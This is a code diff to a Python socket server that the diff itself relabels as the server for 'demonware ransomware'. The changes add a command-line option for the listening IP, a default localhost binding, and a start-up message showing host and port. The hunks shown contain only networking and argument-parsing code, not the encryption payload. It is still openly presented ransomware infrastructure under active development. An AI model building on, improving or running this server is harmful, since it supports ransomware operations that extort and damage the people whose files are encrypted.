@@ -1,3 +1,4 @@
+#/usr/bin/env python
 import os, sys, socket, select, argparse
 
 if len(sys.argv) < 2:
@@ -5,13 +6,18 @@ if len(sys.argv) < 2:
 
 def parse_args():
     # Create the arguments
-    parser = argparse.ArgumentParser(description='Server for demonware')
+    parser = argparse.ArgumentParser(description='Server for demonware ransomware')
+    parser.add_argument("-i", "--ip", help="Host the server on given interface ip")
     parser.add_argument("-p", "--port", help="Host the server on the given port")
     return parser.parse_args()
 
 args = parse_args()
 
-host = ''
+if not args.ip:
+    host = '127.0.0.1'
+else:
+    host = args.ip
+
 socket_list = []
 port = int(args.port)
 
@@ -62,7 +68,7 @@ def server():
     socket_list.append(server_socket)
 
     print(banner)
-    print("\033[32mServer started on port [%s]\nWaiting...\n\033[0m" % int(port))
+    print("\033[32mServer started on port [%s] [%s]\nWaiting...\n\033[0m" % (host, int(port)))
     header() # Print the header
 
     try:
